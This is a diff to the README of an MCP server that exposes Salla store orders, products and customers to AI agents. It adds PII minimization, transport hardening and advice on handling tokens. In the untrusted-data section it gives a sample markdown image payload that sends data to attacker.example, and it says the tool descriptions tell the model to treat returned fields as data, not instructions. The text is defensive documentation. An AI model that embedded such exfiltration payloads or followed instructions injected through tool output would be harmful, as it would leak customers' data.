@@ -37,22 +37,45 @@ Object.values(TOOLS).every((t) => t.risk === 'read' && t.method === 'GET'); // t
 
 | Tool | Arguments |
 | --- | --- |
-| `salla_list_orders` | `page`, `per_page`, `keyword`, `status`, `from_date`, `to_date` (`YYYY-MM-DD`) |
-| `salla_get_order` | `order_id`, `light` (sends `format=light`: drops shipments, items, pickup branch and customer groups) |
-| `salla_list_products` | `page`, `per_page`, `keyword`, `status`, `category`, `light` (`format=light`) |
+| `salla_list_orders` | `page`, `per_page`, `keyword`, `status`, `from_date`, `to_date` (`YYYY-MM-DD`), `include_contact` |
+| `salla_get_order` | `order_id`, `light` (sends `format=light`), `include_contact` |
+| `salla_list_products` | `page`, `per_page`, `keyword`, `status`, `category`, `light` (default `true`; `false` for full objects) |
 | `salla_get_product` | `product_id` |
-| `salla_list_customers` | `page`, `per_page`, `keyword` (matches mobile, email or name) |
-| `salla_get_customer` | `customer_id` |
+| `salla_list_customers` | `page`, `per_page`, `keyword` (matches mobile, email or name), `date_from`, `date_to` (`YYYY-MM-DD`), `include_contact` |
+| `salla_get_customer` | `customer_id`, `include_contact` |
 
 IDs are positive integers. `page` is an integer ≥ 1, and `per_page` is an integer from 1 to 30.
-Dates must be real calendar dates in `YYYY-MM-DD` form, and `from_date` may not be after `to_date`.
+Dates must be real calendar dates in `YYYY-MM-DD` form, and a range's start may not be after its end.
 Free-text arguments have length limits.
+
+`format=light` on orders drops shipments, items, pickup branch and customer groups. Salla's Order
+Details doc says light becomes its default order format from 2026-09-01, so `items` may be missing
+whether or not you pass `light`. Salla's List Customers doc does not show `per_page`; it is sent but
+may be ignored. Both are unverified against a live store.
 
 ### Results
 
 A successful call returns `structuredContent: { data, pagination? }`. The same JSON is also sent as
-one `text` content item. `pagination` is Salla's own object, passed through unchanged
-(`count`, `total`, `perPage`, `currentPage`, `totalPages`, `links`).
+one `text` content item, as MCP 2025-06-18 recommends for clients without structured-content support.
+`pagination` is Salla's own object (`count`, `total`, `perPage`, `currentPage`, `totalPages`, `links`).
+
+What the model sees is shaped before it leaves the server:
+
+- **PII projection.** Orders and customers are cut to an allowlist of fields (`src/project.ts`).
+  - Orders: `id`, `reference_id`, `date`, `status` (`name`, `slug`), `payment_method`, `currency`,
+    `total`, `amounts`, `items` (`id`, `name`, `sku`, `quantity`, `amounts.total`) and `customer.id`.
+  - Customers: `id`, `city`, `country`.
+  - With `include_contact: true`, the customer's `first_name`, `last_name`, `email`, `mobile` and
+    `mobile_code` are added. Ask for them only when the task needs them.
+  - Never returned: bank details (account number, IBAN), `source_details` (buyer IP, user agent),
+    `birthday`, `gender`, street-level `location`, `receipt_image`, avatars and free-text order
+    `notes` or gift messages.
+- **Control characters.** C0 control characters (except tab, newline and carriage return) and
+  Unicode bidi overrides are stripped from every string.
+- **Size cap.** The serialized result is limited to 64 KiB. A list that is bigger is cut to the
+  items that fit and marked `truncated: true` with `returned_items` and a `hint` to page or narrow.
+  A single record that is bigger becomes a tool error. Salla responses over 5 MiB are refused
+  without being buffered.
 
 A failed call returns `isError: true` with a short message:
 
@@ -60,6 +83,7 @@ A failed call returns `isError: true` with a short message:
 | --- | --- |
 | 401 / 403 | Salla rejected the access token or it lacks scope `<scope>` |
 | 404 | Resource not found |
+| 422 | Request rejected, naming the invalid fields when they are this tool's own arguments (never Salla's messages) |
 | 429 | Rate limit reached, with `Retry-After` / `X-RateLimit-Reset` when Salla sends them |
 | `success: false`, any non-2xx status (including 3xx), timeout, network | Generic message with the HTTP status only |
 
@@ -91,11 +115,18 @@ The MCP client starts the process and passes the token in its launch `env` block
     "salla": {
       "command": "npx",
       "args": ["-y", "@sirb/mcp-salla@0.0.0", "--stdio"],
-      "env": { "SALLA_ACCESS_TOKEN": "<access token from your vault>" }
+      "env": { "SALLA_ACCESS_TOKEN": "${SALLA_ACCESS_TOKEN}" }
     }
   }
 }
 ```
+
+Do not paste the token into this file: client configs are plaintext on disk and easy to commit by
+accident. Have the client (or a wrapper) inject it from a secret store, for example
+`SALLA_ACCESS_TOKEN="$(op read op://sirb/salla/token)"` with 1Password, `secret-tool lookup` on
+Linux or `security find-generic-password -w` on macOS. Use `${VAR}` expansion as above where the
+client supports it; otherwise launch the client from a shell that set the variable. Any process running as the same OS user can read the server's environment
+(`/proc/<pid>/environ`), so run it under a user that hosts nothing untrusted.
 
 Pin an exact version, as above, so the client never silently runs a newer (or hijacked) release.
 Bump the pin deliberately when you upgrade.
@@ -118,8 +149,20 @@ sirb-mcp-salla --http --host 127.0.0.1 --port 3000
 - Every request gets a fresh MCP server and Salla client bound to that request's token, so tokens
   never cross callers or tenants.
 - The default bind address is `127.0.0.1`. On a loopback bind, the `Host` header must be
-  `127.0.0.1`, `localhost` or `[::1]` (DNS-rebinding protection). If you bind to a non-loopback
-  address, put the server behind TLS and an authenticating proxy. The CLI prints a warning when you do.
+  `127.0.0.1`, `localhost` or `[::1]` (DNS-rebinding protection).
+- A request that sends an `Origin` header is accepted only if the origin's hostname is in the same
+  allowlist; `null` and non-http(s) origins are rejected (MCP 2025-06-18 transports). Requests
+  without `Origin`, which is normal for non-browser MCP clients, are unaffected.
+- Binding a non-loopback address is refused unless you pass `--allow-remote` **and** at least one
+  `--allowed-host <name>` (the hostnames clients use to reach it):
+
+  ```sh
+  sirb-mcp-salla --http --host 0.0.0.0 --allow-remote --allowed-host salla-mcp.sirb.svc
+  ```
+
+  Bearer tokens travel in plain HTTP on this listener, so only do this behind TLS (mesh mTLS or an
+  authenticating proxy). The CLI prints a warning when you do.
+- The `Bearer` scheme is matched case-insensitively (RFC 7235).
 - Request bodies are limited to 1 MiB (`413` above that).
 - JSON-RPC batches (array bodies) are rejected with `400`. MCP 2025-06-18 removed batching, and
   this stops one request from fanning out into many concurrent Salla calls.
@@ -161,15 +204,18 @@ await server.connect(transport);
   must not log the `Authorization` header.
   The planned target replaces passthrough with workload identity: the runtime authenticates as a
   workload, and the connector resolves the Salla token from the vault by `org_id`, so tokens never
-  travel with tool calls.
+  travel with tool calls. That needs an ADR signed off by the owner before HTTP mode is deployed
+  beyond loopback or a sidecar.
 - **Data classification.** Every tool's `_meta` and `TOOLS` entry carries `sirb/data-class`
-  (`dataClass`). It is `pii` for orders and customers, which include names, emails, phones and
-  addresses, and `business` for products. All six tools also carry `sirb/untrusted-content: true`
+  (`dataClass`). It is `pii` for orders and customers, and `business` for products. The server
+  already minimizes PII itself (see [Results](#results)); the tag lets the runtime add its own policy. All six tools also carry `sirb/untrusted-content: true`
   (`untrustedContent`), so the runtime can apply PII handling and prompt-injection policies by tag.
 - **Untrusted data (OWASP LLM01).** Product descriptions, customer names, order notes and other
   fields are written by third parties. Tools return them as data only, and every tool description
   tells the model that returned fields are store data, not instructions. Agents built on Sirb should
   never let tool output change their instructions or trigger other tools without policy checks.
+  Clients must not auto-render markdown, links or images from tool output: a product name such as
+  `![x](https://attacker.example/?d=...)` would otherwise exfiltrate data when displayed.
 
 ## Limits
 
@@ -177,7 +223,8 @@ await server.connect(transport);
   behaviour predictable.
 - Fetch pages **sequentially**, as Salla's docs advise, and filter orders by date range where you can.
 - Salla rate limits depend on your plan: 120, 360 or 720 requests per minute. Customer endpoints are
-  also limited to 500 requests per 10 minutes per IP. A `429` becomes a tool error that includes
+  also limited to 500 requests per 10 minutes. Salla's docs say over-limit traffic is throttled
+  (to about 1 request per second); if Salla answers `429`, it becomes a tool error that includes
   `Retry-After` / `X-RateLimit-Reset` when Salla sends them. The server does not retry on its own.
 - The customer object's `groups` array in list responses is deprecated by Salla (2026-02-18). This
   server does not rely on it.
